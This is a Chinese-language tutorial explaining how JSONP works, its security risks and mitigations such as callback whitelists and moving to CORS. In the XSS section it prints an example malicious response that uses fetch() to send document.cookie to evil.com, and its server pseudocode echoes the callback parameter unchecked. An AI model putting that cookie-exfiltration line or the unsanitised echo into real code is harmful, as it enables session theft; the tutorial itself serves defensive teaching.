JSONP（**JSON with Padding**）是一种早期解决浏览器**跨域请求数据**的方法，主要用于绕过同源策略限制，但它也存在一些明显的安全风险。

---

## ✅ 一、JSONP 的原理

### 🧠 核心点：

HTML 中的 `<script>` 标签可以**加载任何来源的 JavaScript 文件**，不会受同源策略限制。

---

### ✅ 原理步骤（图解概念）：

1. 浏览器通过动态插入一个 `<script>` 标签来请求跨域数据：
    
    ```html
    <script src="https://api.example.com/data?callback=handleData"></script>
    ```
    
2. 服务器返回的是一段 JS，而不是 JSON：
    
    ```js
    handleData({ name: '张三', age: 18 });
    ```
    
3. 浏览器执行这段 JS，会调用你提供的全局回调函数 `handleData`。
    

---

### ✅ 示例代码：

#### 浏览器端：

```html
<script>
  function handleData(data) {
    console.log('跨域数据:', data);
  }
</script>

<script src="https://api.example.com/data?callback=handleData"></script>
```

#### 服务器端（伪代码）：

```js
const callback = req.query.callback;
res.send(`${callback}(${JSON.stringify(data)})`);
```

---

## ⚠️ 二、JSONP 的风险

由于 JSONP 是**通过 `<script>` 标签加载外部 JavaScript**，它有如下严重安全隐患：

---

### 🔥 1. **XSS（跨站脚本攻击）**

如果攻击者让你加载恶意的“JSONP”接口，比如：

```html
<script src="https://evil.com/malicious.js"></script>
```

恶意接口返回的内容可能是：

```js
document.cookie = "session=stolen"; fetch("https://evil.com/steal?cookie=" + document.cookie);
```

由于这段代码直接由 `<script>` 执行，浏览器不会拦截，**攻击者可窃取你的 Cookie、Token 或劫持页面行为**。

---

### 🔥 2. **无域名限制、无认证机制**

- JSONP 无法发送请求头（比如 Authorization、Token）
    
- 没有请求来源校验，谁都能调用，只要知道接口地址
    
- 很容易被别人“盗用”接口（流量盗用、数据抓取）
    

---

### 🔥 3. **难以控制错误处理**

- JSONP 无法优雅处理 HTTP 错误（如 404/500）
    
- 如果服务器返回无效 JavaScript，可能导致全局报错或页面崩溃
    

---

## ✅ 三、如何降低 JSONP 风险

|方法|说明|
|---|---|
|❌ 不对敏感数据使用 JSONP|如登录、支付、用户信息等|
|✅ 严格限制回调函数名白名单|避免任意 JS 被执行|
|✅ 为 JSONP 接口增加 referer 校验|只允许特定域名访问|
|✅ 转用 CORS + `fetch` 或 `axios`|更现代、更安全的跨域方案|
|✅ 后端设置中间层代理|用你的服务器代理请求，避免前端跨域|

---

## ✅ 总结

|项目|说明|
|---|---|
|原理|动态插入 `<script>` 加载跨域 JS，JS 内调用全局回调函数|
|优点|兼容性强、绕过 CORS，适合老系统|
|缺点|安全性低、只能 GET 请求、不能传 headers|
|替代方案|CORS、服务器代理、中间层 API 网关|

---

## ✅ 建议

> JSONP 是一个 **过时但仍存在的解决方案**，现在应优先使用 `CORS`（跨域资源共享）或在服务端设置 **反向代理**。除非对方接口只支持 JSONP，不建议继续使用。

---
